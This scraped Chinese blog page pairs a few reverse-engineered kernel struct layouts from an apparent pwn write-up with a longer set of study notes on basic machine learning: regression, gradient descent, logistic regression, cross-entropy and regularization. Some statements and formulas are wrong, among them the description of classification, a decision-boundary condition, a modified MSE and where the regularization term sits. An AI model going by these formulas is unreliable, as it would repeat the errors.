<h2 id="内核结构体"><a href="#内核结构体" class="headerlink" title="内核结构体"></a>内核结构体</h2><p>这里整理了一些内核常用的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">list</span>            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_3)</span><br><span class="line"><span class="number">00000000</span> item            dq ?                    ; offset</span><br><span class="line"><span class="number">00000008</span> mutex           dq ?                    ; offset</span><br><span class="line"><span class="number">00000010</span> field_10        dq ?</span><br><span class="line"><span class="number">00000018</span> field_18        dq ?</span><br><span class="line"><span class="number">00000020</span> field_20        dq ?</span><br><span class="line"><span class="number">00000028</span> <span class="built_in">list</span>            ends</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> fd              struc ; (<span class="keyword">sizeof</span>=<span class="number">0xD0</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> field_0         db <span class="number">200</span> dup(?)</span><br><span class="line"><span class="number">000000</span>C8 using_list      dq ?                    ; offset</span><br><span class="line"><span class="number">000000</span>D0 fd              ends</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> input           struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_4)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: add_item/r</span><br><span class="line"><span class="number">00000000</span> size            dq ?                    ; XREF: add_item+<span class="number">1</span>A/r</span><br><span class="line"><span class="number">00000000</span>                                         ; add_item+<span class="number">35</span>/r</span><br><span class="line"><span class="number">00000008</span> ptr             dq ?                    ; XREF: add_item+<span class="number">39</span>/r</span><br><span class="line"><span class="number">00000010</span> input           ends</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> item            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_5)</span><br><span class="line"><span class="number">00000000</span> refcount        dd ?</span><br><span class="line"><span class="number">00000004</span> null            dd ?</span><br><span class="line"><span class="number">00000008</span> size            dq ?</span><br><span class="line"><span class="number">00000010</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> data            dq ?</span><br><span class="line"><span class="number">00000020</span> item            ends</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">机器学习（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-08 01:34:20" itemprop="dateCreated datePublished" datetime="2022-05-08T01:34:20+08:00">2022-05-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-24 13:48:14" itemprop="dateModified" datetime="2022-05-24T13:48:14+08:00">2022-05-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h2><p>监督学习是从“标记”的训练数据来推断一个功能的机器学习任务，训练数据包括一套训练示例</p>
<ul>
<li>在监督学习中，每个实例都是由一个输入对象（通常为矢量）和一个期望的输出值（也称为监督信号）组成</li>
<li>监督学习算法是分析该训练数据，并产生一个推断的功能，其可以用于映射出新的实例</li>
<li>一个最佳的方案将允许该算法来正确地决定那些看不见的实例的类标签</li>
<li>这就要求学习算法是在一种“合理”的方式从一种从训练数据到看不见的情况下形成</li>
</ul>
<p>监督学习可以分为两类：回归问题，分类问题</p>
<ul>
<li>回归问题：通过给定一组数据，我们想要预测出连续的数值输出</li>
<li>分类问题：我们没法预测一个离散值输出（对或者错，“0”或者“1”，当然也可能是多个确定的选项），只能推测一种结果的可能性</li>
</ul>
<h2 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h2><p>在监督学习中，程序被明确告知了什么是“正确”，而在无监督学习中，训练数据没有任何的“标记”，而程序会尝试把这些训练数据分为：有着某些相同性质的簇（聚类算法）</p>
<ul>
<li>无监督学习即没有标注的训练数据集，需要根据样本间的统计规律对样本集进行分析，常常被用于数据挖掘，用于在大量无标签数据中发现规律</li>
<li>而聚类是无监督学习的常见任务，就是将观察值聚成一个一个的组，每一个组都含有一个或者几个特征，‎聚类的目的在于‎‎把相似的东西聚在一起，而我们并不关心这一类是什么‎‎</li>
<li>因此，一个聚类算法通常只需要知道‎‎如何计算相似度‎‎就可以开始工作了</li>
<li>‎例如无监督学习应该能在不给任何额外提示的情况下，仅依据一定数量的“狗”的图片特征，将“狗”的图片从大量的各种各样的图片中将区分出来</li>
</ul>
<h2 id="线性回归-回归"><a href="#线性回归-回归" class="headerlink" title="线性回归-回归"></a>线性回归-回归</h2><p>线性回归分析（Linear Regression Analysis）是确定两种或两种以上 <strong>变量间相互依赖的定量关系</strong> 的一种 <strong>统计分析方法</strong></p>
<p>例如：</p>
<ul>
<li>身高：由父亲的身高、母亲的身高、家庭收入、所在地区等因素决定</li>
<li>房价：由地段、面积、周围配套、时间等因素决定</li>
</ul>
<p>线性回归要做的是就是找到一个数学公式能相对较完美地把所有自变量组合（加减乘除）起来，得到的结果和目标越接近越好（也就是说，代价函数越小越好）</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651726810083-1653371283126.png" class width="1651726810083"> 
<ul>
<li>线性回归本质上就是把“散点图”拟合为一条直线，有许多种方法可以实现这个操作</li>
<li>其中最常见的算法就是梯度下降，梯度下降可以是代价函数到达最下值</li>
</ul>
<h2 id="多项式回归-回归"><a href="#多项式回归-回归" class="headerlink" title="多项式回归-回归"></a>多项式回归-回归</h2><p>如果您的数据点显然不适合线性回归（通过所有数据点的直线），则多项式回归可能是理想选择</p>
<p>多项式回归与线性回归一样，使用变量 x 和 y 之间的关系来找到通过数据点画线的最佳方法</p>
<p>案例：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651754207050-1653371283127.png" class width="1651754207050"> 
<script type="math/tex; mode=display">
y = ax + b</script><img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651754218878-1653371283127.png" class width="1651754218878"> 
<script type="math/tex; mode=display">
y = ax^2 + bx + c</script><p>我们可以从另外一个角度来理解这个式子，如果把 “x的平方” 理解成一个特征，把 “x” 理解成另外一个特征，这样这式子依然是线性回归的式子，但从 “x” 的角度来看是一个非线性的方程</p>
<p>这样的方式就叫多项式回归，相当于我们为样本多添了特征，这些特征是原来样本的多项式项</p>
<h2 id="均方误差-代价函数"><a href="#均方误差-代价函数" class="headerlink" title="均方误差-代价函数"></a>均方误差-代价函数</h2><p>首先我们需要知道：代价是什么？</p>
<ul>
<li>可以简单的把“代价”理解为“误差”</li>
<li>对于机器学习的目标，无非也就是最小化误差，也就是让代价最小化</li>
</ul>
<p>假设有训练样本 (x, y)，模型为 h，参数为 θ：</p>
<script type="math/tex; mode=display">
h_θ=θ^Tx（θ^T表示θ的转置）</script><p>概况来讲，任何能够衡量模型预测出来的值 h(θ) 与真实值 y 之间的差异的函数都可以叫做代价函数C(θ)，如果有多个样本，则可以将所有代价函数的取值求均值，记做J(θ)，因此可以得出以下关于代价函数的性质： </p>
<ul>
<li>对于每种算法来说，代价函数不是唯一的</li>
<li>代价函数是参数 θ 的函数</li>
<li>总之，代价函数 J(θ) 可以用来评价模型的好坏，代价函数越小说明模型和参数越符合训练样本 (x, y)</li>
<li>J(θ) 是一个标量</li>
</ul>
<p>代价函数（cost function）是用来衡量模型好坏的函数，我们的目标当然是得到最好的模型（也就是最符合训练样本的模型），因此训练参数的过程就是不断改变 θ，从而得到更小的 J(θ) 的过程，理想情况下，当我们取到代价函数 J 的最小值时，就得到了最优的参数 θ </p>
<p>均方误差（Mean squared error）是在线性回归中最常用的代价函数：</p>
<script type="math/tex; mode=display">
J(θ)=
\frac1{2m}\sum_{i=1}^m(\hat y^{(i)}−y^{(i)})^2=
\frac1{2m}\sum_{i=1}^m(h_θ(x^{(i)})−y^{(i)})^2</script><ul>
<li>m：训练样本的个数</li>
<li>hθ(x)：用参数θ和x预测出来的y值</li>
<li>y：原训练样本中的y值，也就是标准答案</li>
<li>上角标(i)：第i个样本</li>
</ul>
<p>适用的线性方程为：（其实就是一次函数）</p>
<script type="math/tex; mode=display">
h_θ=θ_0+θ_1x(适用的线性方程)</script><p>注意：在实际的操作中，代价函数处理返回 cost(代价) 以外，还需要返回 grad(梯度)，也就是当前代价的偏导数（可以去看看后续的实验操作中的代价函数，它们都是返回这两个值的）</p>
<ul>
<li>相应地，线性回归的代价对 θj 的偏导数定义为：（无正则化）</li>
</ul>
<script type="math/tex; mode=display">
\frac{∂J(θ)}{∂θ_0}=\frac{1}{m}\sum_{i=1}^{m}(h_θ(x^{(i)})-y^{(i)})x_{j}^{(i)}</script><h2 id="梯度下降-拟合函数"><a href="#梯度下降-拟合函数" class="headerlink" title="梯度下降-拟合函数"></a>梯度下降-拟合函数</h2><p>梯度下降用于将函数 J（代价函数）最小化，其核心思想是通过求梯度的方法来找到代价函数的最小值</p>
<ul>
<li>假设我们有一个需要最小化的函数 J(θ) ，我们需要做的就是从“0”开始一点一点改变 θ（如果有 θ1，θ2 …. 也要一起修改），直到我们找到 J(θ) 的最小值</li>
<li>当然不是随意修改 θ，每次都要在原来的基础上选择下降最快的方式</li>
</ul>
<p>第一次操作：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651675596794-1653371283127.png" class width="1651675596794"> 
<p>第二次操作：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651675709683-1653371283127.png" class width="1651675709683"> 
<p>可以发现：两次操作都是在当前的基础上获取最优解，但是结果却截然不同，这就是梯度下降的特点之一，下面看看梯度下降具体的数学原理：（为了方便理解，这里只设置了两个参数θ）</p>
<script type="math/tex; mode=display">
repeat\,\,\, until\,\,\, convergence\{ 
\\
θ_j:=θ_j-\alpha\frac∂{∂θ_j}J(θ_0,θ_1)\quad(for\,\,\,j=0\,\,\,and\,\,\,j=1)
\\
\}</script><p>反复执行这个过程，直至收敛</p>
<ul>
<li>“:=” 用来表示赋值，相当于C语言中的“=”</li>
<li>“α”（学习率）用于控制每次梯度下降时需要迈出的步幅</li>
<li>“θ” 用于表示参数（案例中就是代表了x，y），每次需要同时同步更新各个“θ”</li>
</ul>
<p>正确的更新方式：</p>
<script type="math/tex; mode=display">
temp0:=θ_0-\alpha\frac∂{∂θ_0}J(θ_0,θ_1)\\
temp1:=θ_1-\alpha\frac∂{∂θ_1}J(θ_0,θ_1)\\
θ_0:=temp0\\
θ_1:=temp1\\</script><p>错误的更新方式：</p>
<script type="math/tex; mode=display">
temp0:=θ_0-\alpha\frac∂{∂θ_0}J(θ_0,θ_1)\\
θ_0:=temp0\\
temp1:=θ_1-\alpha\frac∂{∂θ_1}J(θ_0,θ_1)\\
θ_1:=temp1\\</script><h2 id="正规方程-拟合函数"><a href="#正规方程-拟合函数" class="headerlink" title="正规方程-拟合函数"></a>正规方程-拟合函数</h2><p>为了获取代价函数的最小值，我们采用了梯度下降这种迭代的方式，分多次进行求解，而正规方程只需要运算一次就可以获取最小值</p>
<p>如果我们要获取一个函数最小值，最常见的办法就是对它求导，如果函数的最高次很高的话，方程就会很复杂，使用算法难以实现，而正规方程利用矩阵完成了这个过程</p>
<p>PS：本人太菜，理解不了正规方程</p>
<h2 id="特征规范化-优化"><a href="#特征规范化-优化" class="headerlink" title="特征规范化-优化"></a>特征规范化-优化</h2><p>不同特征具有不同量级时会导致：</p>
<ul>
<li>数量级的差异将导致量级较大的特征占据主导地位</li>
<li>数量级的差异将导致迭代收敛速度减慢（收敛过程会来回偏转）</li>
<li>依赖于样本距离的算法对于数据的数量级非常敏感</li>
</ul>
<p>所以，当特征相差几个数量级时，首先执行特征缩放可以使梯度下降更快地收敛，另外，特征的值过大或过小也会导致收敛速度下降</p>
<p>特征缩放：我们可以对特征进行“乘除”操作，来使其到达合适的范围</p>
<ul>
<li>从数据集中减去每个特征的平均值</li>
<li>减去平均值后，再将特征值按各自的“标准偏差”进行缩放（除）</li>
</ul>
<h2 id="逻辑回归-分类"><a href="#逻辑回归-分类" class="headerlink" title="逻辑回归-分类"></a>逻辑回归-分类</h2><p>Logistic Regression 虽然被称为回归，但其实际上是分类模型，并常用于二分类，用于解决分类问题</p>
<p>下面是一些分类问题的例子：</p>
<ul>
<li>邮件垃圾分类</li>
<li>交易是否有欺诈</li>
</ul>
<p>通常，这些数据都只有两种或几种可能（有限次数）：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651830266751-1653371283127.png" class width="1651830266751"> 
<p>用线性回归来不能很好的拟合这些数据，因此逻辑回归诞生了</p>
<p>逻辑回归的本质是：假设数据服从这个分布，然后使用极大似然估计做参数的估计</p>
<h2 id="假设陈述-分类"><a href="#假设陈述-分类" class="headerlink" title="假设陈述-分类"></a>假设陈述-分类</h2><p>首先，我们需要我们的分类器输出值在 [ 0 , 1 ] 之间，因此，我们提出一个“假设”来满足该性质，假设的形式为：</p>
<script type="math/tex; mode=display">
h_θ=g(θ^Tx)</script><p>我们定义函数 g 为：</p>
<script type="math/tex; mode=display">
g(z)=\frac1{1+e^{-z}}</script><p>把它们组合一下，可以得到：</p>
<script type="math/tex; mode=display">
h_θ=\frac1{1+e^{-θ^Tx}}</script><p>这就是 Sigmoid 函数（另外，sigmoid 函数和 logistic 函数是同一个意思，完全可以相互替换），它的图形大概是这个样子：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651831283984-1653371283127.png" class width="1651831283984"> 
<p>当假设输出某个数字时，我们会把这个数字当做：对于输入值“x”，“y=1”的概率估计</p>
<p>例如：假设一个学校需要根据学生的成绩来录取学生，而我们拥有学生成绩这一数据集，于是我们把学生成绩作为“x”输入 Sigmoid 函数 h(x)，就可以得到该学生录取的概率</p>
<p>但是，我们仍然需要利用各种拟合函数使 θ 最小化，这样 Sigmoid 函数才有意义</p>
<h2 id="决策边界-分类"><a href="#决策边界-分类" class="headerlink" title="决策边界-分类"></a>决策边界-分类</h2><p>理解决策边界（Decision Boundary），可以帮助我们了解 Sigmoid 函数到底在计算什么</p>
<p>Sigmoid 函数的图形：</p>
<p><img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Users/ywx813/Desktop/机器学习/机器学习/1651831283984.png" alt="1651831283984"> </p>
<p>我们发现：</p>
<ul>
<li>当 z &lt; 0 时，h(x) &lt; 0.5（“z”就是函数 g(z) 的参数）</li>
<li>当 z &gt; 0 时，h(x) &gt; 0.5（“z”就是函数 g(z) 的参数）</li>
</ul>
<p>所以点 (0 , 0.5) 就是“决策边界”的判定点：</p>
<ul>
<li>如果 “h(x) &lt; 0.5” ，z &lt; 0，我们判断 “y=0” </li>
<li>如果 “h(x) &gt; 0.5” ，z &gt; 0，我们判断 “y=1” </li>
<li>如果 “h(x) = 0.5” ，预测为正类（我们不用在意）</li>
</ul>
<p>于是判断样本是否为某个“可能”的条件，从 “h(x) vs 0.5” 转化为了 “z vs 0”，这里的 z 就是我们需要拟合的模板函数（要根据数据集散点图判断该函数的形状，然后添加对应的多项式），当拟合完毕后，z 就是“决策边界”</p>
<p>案例一：</p>
<p>假设我们有如下一组数据集：（多特征）</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651890724535-1653371283127.png" class width="1651890724535">  
<p>并且我们已经拟合好了数据（利用“拟合函数”使“代价函数”最小），得到一组固定的 θ [-3,1,1] </p>
<p>用直线 -3+x1+x2 = 0 作为“决策边界”：</p>
<ul>
<li>如果 “ -3+x1+x2 &gt; 0 ” ，我们判断 “y=1” </li>
<li>如果 “ -3+x1+x2 &lt; 0 ” ，我们判断 “y=0” </li>
<li>如果 “ -3+x1+x2 &lt; 0 ” ，预测为正类</li>
</ul>
<p>案例二：</p>
<p>假设我们有如下一组数据集：（增添两个格外特征）</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651891357766-1653371283127.png" class width="1651891357766"> 
<p>并且我们已经拟合好了数据，得到一组固定的 θ [-1,0,0,1,1] </p>
<p>用圆 -1+(x1)^2+(x2)^2 = 0 作为“决策边界”：</p>
<ul>
<li>-1+(x1)^2+(x2)^2 &gt; 0，我们判断 “y=1” </li>
<li>-1+(x1)^2+(x2)^2 &lt; 0，我们判断 “y=0” </li>
<li>-1+(x1)^2+(x2)^2 = 0，预测为正类</li>
</ul>
<p>通过在特征中增加这些复杂的多项式，我们可以得到更复杂的决策边界</p>
<p>注意：决策边界不是训练集的属性，只要给定了 θ ，决策边界就确定了，而不是用训练集来定义决策边界</p>
<h2 id="多元分类-分类"><a href="#多元分类-分类" class="headerlink" title="多元分类-分类"></a>多元分类-分类</h2><p>在实际问题中，我们可能会遇到有“多种可能”的特征</p>
<p>例如：</p>
<ul>
<li>邮件分类：家人，同学，诈骗……</li>
<li>考试等级：A，B，C，D……</li>
</ul>
<p>接下来我们就来讨论遇到多元分类时的处理办法，假设有一个三元分类：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651931216147-1653371283127.png" class width="1651931216147"> 
<p>我们可以把这个三元分类分为三个二元分类：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651932054305-1653371283127.png" class width="1651932054305"> 
<p>可以把另外两个分类定义为新的“伪训练集”，然后按照二元分类的方式进行拟合</p>
<p>最后，我们有三个分类器，每个分类器都针对其中一种情况进行训练，得到对应分类“P==1”成立的概率，分类器通式如下：</p>
<script type="math/tex; mode=display">
h_θ^(x)=P(y=i|x;θ)\,\,\,\,\,\,(i=1,2,3)</script><p>意义为：当给定了 “x” 和 “θ” 时，“y = i” 的概率，虽然这三者的概率加起来可能不为“1”，但是我们并不关心，我们只需要选择概率最高的那个就可以了</p>
<h2 id="交叉熵-代价函数"><a href="#交叉熵-代价函数" class="headerlink" title="交叉熵-代价函数"></a>交叉熵-代价函数</h2><p>先看看回归问题常用的代价函数：<strong>均方误差</strong>（做了一些变化）</p>
<script type="math/tex; mode=display">
J(θ)=\frac1{m}\sum_{i=1}^m(\frac1{2}h_θ(x^{(i)})−y^{(i)})^2</script><p>我们把关键的部分提取出来：</p>
<script type="math/tex; mode=display">
J(θ)=\frac1{m}\sum_{i=1}^mCost(h_θ(x^{(i)}),y^{(i)})\\
Cost(h_θ(x^{(i)}),y^{(i)})=\frac1{2}(h_θ(x^{(i)})-y^{(i)})^2</script><p>问题的关键就是 h(x) 函数（模型），线性回归和逻辑回归的 h(x) 函数是不同的：</p>
<p>线性回归：</p>
<ul>
<li>公式</li>
</ul>
<script type="math/tex; mode=display">
h_θ=θ^Tx</script><ul>
<li>图像</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651914301836-1653371283127.png" class width="1651914301836"> 
<p>逻辑回归：</p>
<ul>
<li>公式</li>
</ul>
<script type="math/tex; mode=display">
h_θ=\frac1{1+e^{-θ^Tx}}</script><ul>
<li>图像</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651914279033-1653371283127.png" class width="1651914279033"> 
<p>可以发现：h(x) 函数的改变导致“代价函数-均方误差”变为了非凸函数，使梯度下降算法不容易找到代价函数的最小值（可能找到一个极小值点就停了），这样会导致梯度下降的拟合性很差</p>
<p>为了解决这个问题，逻辑回归会使用适用于它自己的代价函数-<strong>交叉熵</strong></p>
<script type="math/tex; mode=display">
J(θ)=\frac1{m}\sum_{i=1}^mCost(h_θ(x^{(i)}),y^{(i)})
=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{(i)}))]</script><h2 id="fminunc-拟合函数"><a href="#fminunc-拟合函数" class="headerlink" title="fminunc-拟合函数"></a>fminunc-拟合函数</h2><p>fminunc 采用拟牛顿法 (QN)，是一种使用导数的算法，优化工具箱提供 fmincon 函数用于对有约束优化问题进行求解</p>
<p>Octave/MATLAB 的 fminunc 是一个优化解算器，可以找到无约束函数的最小值，对于逻辑回归，需要优化成本函数 J(θ)，具体来说，您将使用 fminunc 找到最佳参数 θ 对于逻辑回归成本函数 J(θ)</p>
<p>在 Python 中也有该函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scipy.optimize <span class="comment"># SciPy的optimize模块提供了常用的最优化算法函数实现</span></span><br><span class="line"></span><br><span class="line">theta, cost, *unused = opt.fmin_bfgs(f=cost_func, fprime=grad_func, x0=init_theta, maxiter=<span class="number">400</span>, full_output=<span class="literal">True</span>, disp=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<h2 id="过拟合问题-优化"><a href="#过拟合问题-优化" class="headerlink" title="过拟合问题-优化"></a>过拟合问题-优化</h2><p>我们还是以“预测房子的价格”为案例：</p>
<ul>
<li>房子的价格和房子的大小有关</li>
</ul>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651936037264-1653371283127.png" class width="1651936037264"> 
<p>现在根据拟合程度的不同，有三种情况：A（左），B（中），C（右）</p>
<ul>
<li>随着房子的面积增大，房子的价格趋于平缓，所以 A 不能很好的拟合该模型（称为欠拟合）</li>
<li>在 B 中加入了一个2次多项式，使拟合效果很好</li>
<li>而 C 中加入了一个3次多项式，一个4次多项式，在现有的数据集中也许可以很好的拟合，但是总体来说不符合实际，我们也没有更多的数据来约束它（称为过拟合）</li>
</ul>
<p>这种过度拟合的问题会在参数θ变多的情况下发生：</p>
<ul>
<li>因为能更好的拟合现有的数据，所以随着参数θ增多， J(θ)（代价函数）会不断的接近“0”，但是拟合曲线也会越来越扭曲</li>
<li>拟合曲线会千方百计的拟合数据集，如果没有足够的数据来约束它，它就可能无法泛化到新的样本中，导致无法预测数据</li>
</ul>
<p>下面这个逻辑回归的例子可能会明显些：</p>
<img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651937189755-1653371283127.png" class width="1651937189755">  
<p>解决办法：</p>
<ul>
<li>数据可视化：绘制决策边界的图像，初步判断参数θ的数目合不合适</li>
<li>人工调查选择：在数据比较复杂的模型中，绘图是比较困难的而且往往解决不了问题（有时即使有图形，也不好判断是否过拟合），所以需要人工排查哪些变量比较重要，那些可以去除，尽可能减少变量</li>
<li>模型选择算法：可以自动选择哪些特征变量可以保留，哪些可以去除（但是这种算法不可控，可能会因为舍弃关键变量，而导致拟合程度下降）</li>
<li>正则化：我们将保留所有特征变量，但是减少量级，或者参数θ的大小</li>
</ul>
<h2 id="正则化-优化-代价函数"><a href="#正则化-优化-代价函数" class="headerlink" title="正则化-优化-代价函数"></a>正则化-优化-代价函数</h2><img src="/2022/05/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1651938047847-1653371283127.png" class width="1651938047847"> 
<p>在之前的案例中：增加参数θ的数目会导致 <strong>过拟合</strong>，使泛化效果不好</p>
<p>如果我们在函数中加入“惩罚项”，使“θ3”，“θ4”变得很小，这就可以平衡过拟合的影响</p>
<p><strong>正则化-均方误差</strong></p>
<script type="math/tex; mode=display">
J(θ)=\frac1{2m}[\sum_{i=1}^m(h_θ(x^{(i)})−y^{(i)})^2+λ\sum_{j=1}^nθ_j^{2}]</script><p>其实就是在标准均方误差上面加了一项（惩罚项，正则化项），使其缩小所有的参数（因为我们不知道要优化哪些参数），这里的 λ 就是正则化参数，用于控制各个参数之间的平衡</p>
<p>PS：之后在重选择中 ，会有很多方法来自动选择 λ</p>
<p><strong>正则化-交叉熵</strong></p>
<script type="math/tex; mode=display">
J(θ)=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{(i)}))]
+\frac{λ}{2m}\sum_{j=1}^nθ_j^{2}</script><h2 id="正则化-优化-拟合函数"><a href="#正则化-优化-拟合函数" class="headerlink" title="正则化-优化-拟合函数"></a>正则化-优化-拟合函数</h2><p>之前我们使用了梯度下降的方法来拟合模型，如果对代价函数进行了正则化，那么 <strong>梯度下降</strong> 也要进行正则化才行</p>
<p><strong>适用于均方误差-梯度下降</strong></p>
<p>梯度下降通用公式：</p>
<script type="math/tex; mode=display">
repeat\,\,\, until\,\,\, convergence\{ 
\\
θ_j:=θ_j-\alpha\frac∂{∂θ_j}J(θ)\quad(j=0\,\,,1\,\,,2\,......)
\\
\}</script><p>把 J(θ) 替换为均方误差：</p>
<script type="math/tex; mode=display">
repeat\,\,\, until\,\,\, convergence\{ 
\\
θ_j:=θ_j-\alpha\frac1{m}\sum_{i=1}^m(h_θ(x^{(i)})-y^{(i)})x_j^{(i)}
\quad(j=0\,\,,1\,\,,2\,......)
\\
\}</script><p>进行正则化：</p>
<script type="math/tex; mode=display">
repeat\,\,\, until\,\,\, convergence\{ 
\\
θ_j:=θ_j-\alpha[\frac1{m}\sum_{i=1}^m(h_θ(x^{(i)})-y^{(i)})x_j^{(i)}+\frac{λ}{m}θ_j]
\quad(j=1\,\,,2\,\,,3\,......)(我们约定正则从1开始)
\\
\}</script><p><strong>适用于交叉熵-梯度下降</strong></p>
<p>交叉熵通用公式：</p>
<script type="math/tex; mode=display">
J(θ)=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{(i)}))]</script><p>进行正则化：</p>
<script type="math/tex; mode=display">
J(θ)=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{(i)}))+\frac{λ}{2m}\sum_{j=1}^nθ_j^{2}]</script><p><strong>同时，求梯度的公式也需要正则化</strong>（通常的代价函数都会返回：cost(代价)，grad(梯度)）</p>
<p>求梯度通用公式：</p>
<script type="math/tex; mode=display">
\frac{∂J(θ)}{∂θ_0}=\frac{1}{m}\sum_{i=1}^{m}(h_θ(x^{(i)})-y^{(i)})x_{j}^{(i)}</script><p>进行正则化：（注意：正则化是从“1”开始，而不是“0”）</p>
<script type="math/tex; mode=display">
\frac{∂J(θ)}{∂θ_0}=\frac{1}{m}\sum_{i=1}^{m}(h_θ(x^{(i)})-y^{(i)})x_{j}^{(i)}\quad for\,\,j=0\\
\frac{∂J(θ)}{∂θ_0}=(\frac{1}{m}\sum_{i=1}^{m}(h_θ(x^{(i)})-y^{(i)})x_{j}^{(i)})+\frac{λ}{m}θ_j\quad for\,\,j>0</script><h2 id="向量化-优化-代价函数"><a href="#向量化-优化-代价函数" class="headerlink" title="向量化-优化-代价函数"></a>向量化-优化-代价函数</h2><p>向量化是非常基础的去除代码中 <strong>for</strong> 循环的艺术</p>
<ul>
<li>当在深度学习安全领域、深度学习实践中应用深度学习算法时，会发现在代码中显式地使用 for 循环使算法很低效</li>
<li>所以算法能应用且没有显式的 for 循环是很重要的，并且会帮助你适用于更大的数据集</li>
</ul>
